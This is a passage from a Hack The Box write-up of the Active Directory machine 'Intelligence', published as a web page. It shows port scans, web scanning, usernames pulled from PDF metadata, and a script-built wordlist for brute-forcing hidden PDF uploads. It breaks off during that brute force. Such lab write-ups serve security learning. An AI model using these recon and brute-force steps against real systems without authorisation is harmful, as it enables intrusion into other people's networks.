@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Intelligence | Paracausal Telemetry</title><meta name="description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), User enumeration via PDF files." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-intelligence/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Intelligence" /><meta property="og:description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), User enumeration via PDF files." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-intelligence/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-intelligence/og.png?v=caaa4c88" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Intelligence" /><meta name="twitter:description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), User enumeration via PDF files." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-intelligence/og.png?v=caaa4c88" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Intelligence","description":"Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), User enumeration via PDF files.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-intelligence/","datePublished":"2026-04-14","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Intelligence","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-intelligence/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Intelligence</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-04-14 · 15 min read</p><h1>Intelligence</h1><p>Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), User enumeration via PDF files.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · medium</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Intelligence" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-intelligence.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-intelligence.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Intelligence</h2><p>Intelligence is a medium difficulty Windows machine that showcases a number of common attacks in an Active Directory environment. After retrieving internal PDF documents stored on the web server (by brute-forcing a common naming scheme) and inspecting their contents and…</p></div><span class="room-badge room-badge-medium">Medium</span></div><dl class="room-facts"><div><dt>Released</dt><dd>3 Jul 2021</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>Micah</dd></div><div><dt>Rating</dt><dd>4.6 / 5</dd></div><div><dt>User owns</dt><dd>9,223</dd></div><div><dt>Root owns</dt><dd>7,069</dd></div><div><dt>User blood</dt><dd>InfoSecJack<small class="room-blood-time">0H 14M 35S</small></dd></div><div><dt>Root blood</dt><dd>InfoSecJack<small class="room-blood-time">0H 56M 44S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 8838 votes from easiest to hardest"><rect x="0" y="59" width="20" height="5" rx="2" fill="hsl(96 70% 55%)"><title>209 votes</title></rect><rect x="26" y="58" width="20" height="6" rx="2" fill="hsl(96 70% 55%)"><title>265 votes</title></rect><rect x="52" y="41" width="20" height="23" rx="2" fill="hsl(80 70% 55%)"><title>1012 votes</title></rect><rect x="78" y="24" width="20" height="40" rx="2" fill="hsl(70 70% 55%)"><title>1800 votes</title></rect><rect x="104" y="0" width="20" height="64" rx="2" fill="hsl(50 70% 55%)"><title>2861 votes</title></rect><rect x="130" y="34" width="20" height="30" rx="2" fill="hsl(38 70% 55%)"><title>1353 votes</title></rect><rect x="156" y="45" width="20" height="19" rx="2" fill="hsl(28 70% 55%)"><title>861 votes</title></rect><rect x="182" y="58" width="20" height="6" rx="2" fill="hsl(16 70% 55%)"><title>267 votes</title></rect><rect x="208" y="62" width="20" height="2" rx="2" fill="hsl(8 70% 55%)"><title>86 votes</title></rect><rect x="234" y="61" width="20" height="3" rx="2" fill="hsl(0 70% 55%)"><title>124 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 7.2, Real-Life 6.6, CVE 5.1, Custom Exploitation 4.9, CTF-Like 3.4"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,59.6 153.9,95.7 131.0,138.9 89.8,137.7 87.4,102.6" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Intelligence" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.95.154 --generate-hosts-file /etc/hosts                                                                  
+[sudo] password for kali: 
+SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><ul><li>SMB signing is enabled</li><li>Null auth enabled</li></ul><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT dc.intelligence.htb   
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-14 15:29 +0100
+Nmap scan report for dc.intelligence.htb (10.129.95.154)
+Host is up (0.015s latency).
+rDNS record for 10.129.95.154: DC.intelligence.htb
+Not shown: 65517 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+9389/tcp  open  adws
+49667/tcp open  unknown
+49691/tcp open  unknown
+49692/tcp open  unknown
+49711/tcp open  unknown
+49717/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.79 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,80,88,135,139,445,464,593,636,3268,3269,9389 -A --min-rate=2000 -sT dc.intelligence.htb
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-14 15:31 +0100
+Nmap scan report for dc.intelligence.htb (10.129.95.154)
+Host is up (0.015s latency).
+rDNS record for 10.129.95.154: DC.intelligence.htb
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: Intelligence
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-14 21:31:55Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-04-14T21:33:20+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-04-14T21:33:20+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-04-14T21:33:20+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (96%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (96%), Microsoft Windows 10 1903 - 21H1 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>SMB (445)</h2><p>Null auth is enabled cannot list shares or users</p><p>Guest account is disabled</p><h2>HTTP (80)</h2><h3>Nuclei</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nuclei -u http://intelligence.htb/                                                                
+
+[iis-shortname-detect] [http] [info] http://intelligence.htb/*~1*/a.aspx
+[iis-shortname-detect] [http] [info] http://intelligence.htb/jta3iyc9*~1*/a.aspx
+[iis-shortname-detect] [http] [info] http://intelligence.htb/*~1*/a.aspx
+[waf-detect:modsecurity] [http] [info] http://intelligence.htb/
+[ldap-metadata] [javascript] [info] intelligence.htb:389 [&quot;BaseDN: dc=389&quot;,&quot;DnsHostName: dc.intelligence.htb&quot;,&quot;DefaultNamingContext: DC=intelligence,DC=htb&quot;,&quot;DomainFunctionality: 7&quot;,&quot;ForestFunctionality: 7&quot;,&quot;DomainControllerFunctionality: 7&quot;]
+[smb-enum] [javascript] [info] intelligence.htb:445 [&quot;OSVersion: 10.0.17763&quot;,&quot;NetBIOSComputerName: DC&quot;,&quot;NetBIOSDomainName: intelligence&quot;,&quot;DNSComputerNamen: dc.intelligence.htb&quot;,&quot;DNSComputerName: dc.intelligence.htb&quot;,&quot;ForestName: intelligence.htb&quot;]
+[smb-enum-domains] [javascript] [info] intelligence.htb:445 [&quot;DomainName: intelligence.htb&quot;]
+[smb-os-detect] [javascript] [info] intelligence.htb:445 [&quot;Windows Server 2019, Version 1809&quot;]
+[smb-version-detect:smb-version] [javascript] [info] intelligence.htb:445 [&quot;SMB 2.1&quot;]
+[smb2-capabilities] [javascript] [info] intelligence.htb:445 [&quot;[&quot;DFSSupport&quot;,&quot;LargeMTU&quot;,&quot;Leasing&quot;]&quot;]
+[smb2-server-time] [javascript] [info] intelligence.htb:445 [&quot;SystemTime: 2026-04-14T21:39:27.000Z ServerStartTime: 2009-04-22T19:24:48.000Z&quot;]
+[ldap-anonymous-login-detect] [javascript] [medium] intelligence.htb:389
+[form-detection] [http] [info] http://intelligence.htb/
+[microsoft-iis-version] [http] [info] http://intelligence.htb/ [&quot;Microsoft-IIS/10.0&quot;]
+[http-missing-security-headers:clear-site-data] [http] [info] http://intelligence.htb/
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://intelligence.htb/
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://intelligence.htb/
+[http-missing-security-headers:referrer-policy] [http] [info] http://intelligence.htb/
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://intelligence.htb/
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://intelligence.htb/
+[http-missing-security-headers:missing-content-type] [http] [info] http://intelligence.htb/
+[http-missing-security-headers:strict-transport-security] [http] [info] http://intelligence.htb/
+[http-missing-security-headers:content-security-policy] [http] [info] http://intelligence.htb/
+[http-missing-security-headers:permissions-policy] [http] [info] http://intelligence.htb/
+[http-missing-security-headers:x-frame-options] [http] [info] http://intelligence.htb/
+[http-missing-security-headers:x-content-type-options] [http] [info] http://intelligence.htb/
+[options-method] [http] [info] http://intelligence.htb/ [&quot;OPTIONS, TRACE, GET, HEAD, POST&quot;]
+[tech-detect:ms-iis] [http] [info] http://intelligence.htb/
+[caa-fingerprint] [dns] [info] intelligence.htb</code></pre><h3>Ffuf for subdomains</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nothing found</code></pre><h3>Feroxbuster</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">feroxbuster -u http://intelligence.htb/ -C 404 
+
+200      GET       56l      165w     1850c http://intelligence.htb/documents/scripts.js
+200      GET        1l       44w     2532c http://intelligence.htb/documents/jquery.easing.min.js
+200      GET        8l       29w    28898c http://intelligence.htb/documents/favicon.ico
+200      GET      106l      659w    26989c http://intelligence.htb/documents/demo-image-01.jpg
+200      GET      208l      768w    47856c http://intelligence.htb/documents/2020-01-01-upload.pdf
+200      GET      209l      800w    48542c http://intelligence.htb/documents/2020-12-15-upload.pdf
+200      GET        7l     1031w    84152c http://intelligence.htb/documents/bootstrap.bundle.min.js
+200      GET        2l     1297w    89476c http://intelligence.htb/documents/jquery.min.js
+301      GET        2l       10w      157c http://intelligence.htb/documents =&gt; http://intelligence.htb/documents/
+403      GET       29l       92w     1233c http://intelligence.htb/documents/
+200      GET      492l     2733w   186437c http://intelligence.htb/documents/demo-image-02.jpg
+200      GET    10345l    19793w   190711c http://intelligence.htb/documents/styles.css
+301      GET        2l       10w      157c http://intelligence.htb/Documents =&gt; http://intelligence.htb/Documents/
+200      GET        5l   108280w  1194960c http://intelligence.htb/documents/all.js
+200      GET      129l      430w     7432c http://intelligence.htb/
+301      GET        2l       10w      157c http://intelligence.htb/DOCUMENTS =&gt; http://intelligence.htb/DOCUMENTS/
+400      GET        6l       26w      324c http://intelligence.htb/error%1F_log
+400      GET        6l       26w      324c http://intelligence.htb/documents/error%1F_log
+400      GET        6l       26w      324c http://intelligence.htb/Documents/error%1F_log
+400      GET        6l       26w      324c http://intelligence.htb/DOCUMENTS/error%1F_log</code></pre><p>Documents directory gives a 403 but i can access files inside</p><h3>Website functionality</h3><p><img src="images/intelligence/pasted-image-20260414154349.webp" alt="Screenshot" loading="lazy" /></p><p>Subscription functionality</p><p>Two PDF downloads on the landing page of the website</p><p><code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></p><p><code>http://intelligence.htb/documents/2020-12-15-upload.pdf</code></p><h2>User enumeration via PDF files</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">exiftool 2020-01-01-upload.pdf          
+ExifTool Version Number         : 13.50
+File Name                       : 2020-01-01-upload.pdf
+Directory                       : .
+File Size                       : 27 kB
+File Modification Date/Time     : 2021:04:01 18:00:00+01:00
+File Access Date/Time           : 2026:04:14 15:48:23+01:00
+File Inode Change Date/Time     : 2026:04:14 15:48:23+01:00
+File Permissions                : -rw-rw-r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.5
+Linearized                      : No
+Page Count                      : 1
+Creator                         : William.Lee</code></pre><p>Found a user <code>william.lee</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">exiftool 2020-12-15-upload.pdf 
+ExifTool Version Number         : 13.50
+File Name                       : 2020-12-15-upload.pdf
+Directory                       : .
+File Size                       : 27 kB
+File Modification Date/Time     : 2021:04:01 18:00:00+01:00
+File Access Date/Time           : 2026:04:14 15:49:13+01:00
+File Inode Change Date/Time     : 2026:04:14 15:49:13+01:00
+File Permissions                : -rw-rw-r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.5
+Linearized                      : No
+Page Count                      : 1
+Creator                         : Jose.Williams</code></pre><p>Another user <code>jose.williams</code></p><p>Neither of these users are AS-REP roastable</p><p>I could try and create a wordlist for this format and try to bruteforce any of those files</p><h2>Brute forcing PDF endpoints</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat PDF-wordlist.py                                                    
+from datetime import date, timedelta
+
+start = date(2019, 1, 1)
+end = date(2026, 4, 14)
+
+with open(&quot;dates_wordlist.txt&quot;, &quot;w&quot;) as f:
+    current = start
+    while current &lt;= end:
+        f.write(f&quot;{current.strftime(&#39;%Y-%m-%d&#39;)}-upload.pdf\n&quot;)
+        current += timedelta(days=1)</code></pre><p>Ill use this script to generate a wordlist with a load of possibilities ill use feroxbuster to do this</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">feroxbuster -u http://intelligence.htb/documents/ -w dates_wordlist.txt -C 404
+
+301      GET        2l       10w      157c http://intelligence.htb/documents =&gt; http://intelligence.htb/documents/
+200      GET      135l      429w    19994c http://intelligence.htb/documents/2020-01-23-upload.pdf
+200      GET      126l      413w    20001c http://intelligence.htb/documents/2020-01-20-upload.pdf
+200      GET      131l      410w    19420c http://intelligence.htb/documents/2020-02-17-upload.pdf
+200      GET      208l      768w    47856c http://intelligence.htb/documents/2020-01-01-upload.pdf
+200      GET      198l      764w    47929c http://intelligence.htb/documents/2020-01-02-upload.pdf
+200      GET      223l      808w    51022c http://intelligence.htb/documents/2020-01-22-upload.pdf
+200      GET      130l      415w    20012c http://intelligence.htb/documents/2020-02-28-upload.pdf
+200      GET      204l      775w    47096c http://intelligence.htb/documents/2020-01-10-upload.pdf
+200      GET      192l      711w    46851c http://intelligence.htb/documents/2020-01-25-upload.pdf
+200      GET      133l      404w    19431c http://intelligence.htb/documents/2020-03-21-upload.pdf
+200      GET      197l      782w    45164c http://intelligence.htb/documents/2020-02-11-upload.pdf
+200      GET      192l      759w    47608c http://intelligence.htb/documents/2020-01-30-upload.pdf
+200      GET      133l      404w    19930c http://intelligence.htb/documents/2020-04-02-upload.pdf
+200      GET      212l      795w    48725c http://intelligence.htb/documents/2020-02-23-upload.pdf
+200      GET      204l      738w    46373c http://intelligence.htb/documents/2020-03-05-upload.pdf
+200      GET      207l      762w    49622c http://intelligence.htb/documents/2020-04-04-upload.pdf
+200      GET      212l      785w    48342c http://intelligence.htb/documents/2020-03-12-upload.pdf
+200      GET      201l      762w    46463c http://intelligence.htb/documents/2020-03-04-upload.pdf
+200      GET      195l      778w    48770c http://intelligence.htb/documents/2020-01-04-upload.pdf
+200      GET      209l      773w    48528c http://intelligence.htb/documents/2020-03-17-upload.pdf
+200      GET      203l      715w    44212c http://intelligence.htb/documents/2020-03-13-upload.pdf
+200      GET      211l      787w    47440c http://intelligence.htb/documents/2020-04-15-upload.pdf
+200      GET      193l      799w    50143c http://intelligence.htb/documents/2020-05-01-upload.pdf
+200      GET      207l      771w    46071c http://intelligence.htb/documents/2020-05-03-upload.pdf
+200      GET      206l      766w    47231c http://intelligence.htb/documents/2020-05-17-upload.pdf
+200      GET      206l      782w    48435c http://intelligence.htb/documents/2020-05-11-upload.pdf
+200      GET      131l      416w    19843c http://intelligence.htb/documents/2020-05-29-upload.pdf
+200      GET      193l      775w    46801c http://intelligence.htb/documents/2020-05-21-upload.pdf
+200      GET      148l      429w    20637c http://intelligence.htb/documents/2020-05-24-upload.pdf
+200      GET      134l      425w    19825c http://intelligence.htb/documents/2020-06-08-upload.pdf
+200      GET      135l      416w    19674c http://intelligence.htb/documents/2020-06-03-upload.pdf
+200      GET      205l      840w    48566c http://intelligence.htb/documents/2020-02-24-upload.pdf
+200      GET      219l      780w    47627c http://intelligence.htb/documents/2020-06-04-upload.pdf
+200      GET      127l      395w    19974c http://intelligence.htb/documents/2020-06-12-upload.pdf
+200      GET      182l      748w    46443c http://intelligence.htb/documents/2020-05-07-upload.pdf
+200      GET      141l      415w    18280c http://intelligence.htb/documents/2020-06-25-upload.pdf
+200      GET      206l      740w    46585c http://intelligence.htb/documents/2020-06-22-upload.pdf
+200      GET      205l      821w    48412c http://intelligence.htb/documents/2020-06-15-upload.pdf
+200      GET      211l      716w    44317c http://intelligence.htb/documents/2020-04-23-upload.pdf
+200      GET      185l      773w    46993c http://intelligence.htb/documents/2020-06-14-upload.pdf
+200      GET      207l      752w    47044c http://intelligence.htb/documents/2020-06-28-upload.pdf
+200      GET      140l      432w    20661c http://intelligence.htb/documents/2020-07-08-upload.pdf
+200      GET      201l      736w    48785c http://intelligence.htb/documents/2020-07-02-upload.pdf
+200      GET      204l      814w    48636c http://intelligence.htb/documents/2020-06-26-upload.pdf
+200      GET      199l      782w    49055c http://intelligence.htb/documents/2020-05-20-upload.pdf
+200      GET      211l      801w    49906c http://intelligence.htb/documents/2020-06-02-upload.pdf
+200      GET      193l      738w    45246c http://intelligence.htb/documents/2020-06-30-upload.pdf
+200      GET      209l      784w    46268c http://intelligence.htb/documents/2020-06-21-upload.pdf
+200      GET      137l      448w    20912c http://intelligence.htb/documents/2020-07-20-upload.pdf
+200      GET      206l      713w    46644c http://intelligence.htb/documents/2020-07-24-upload.pdf
+200      GET      204l      774w    48018c http://intelligence.htb/documents/2020-08-01-upload.pdf
+200      GET      216l      801w    49725c http://intelligence.htb/documents/2020-06-07-upload.pdf
+200      GET      143l      423w    20043c http://intelligence.htb/documents/2020-08-09-upload.pdf
+200      GET      132l      412w    18512c http://intelligence.htb/documents/2020-08-20-upload.pdf
+200      GET      182l      717w    44070c http://intelligence.htb/documents/2020-07-06-upload.pdf
+200      GET      213l      783w    47838c http://intelligence.htb/documents/2020-08-19-upload.pdf
+200      GET      202l      740w    48223c http://intelligence.htb/documents/2020-09-02-upload.pdf
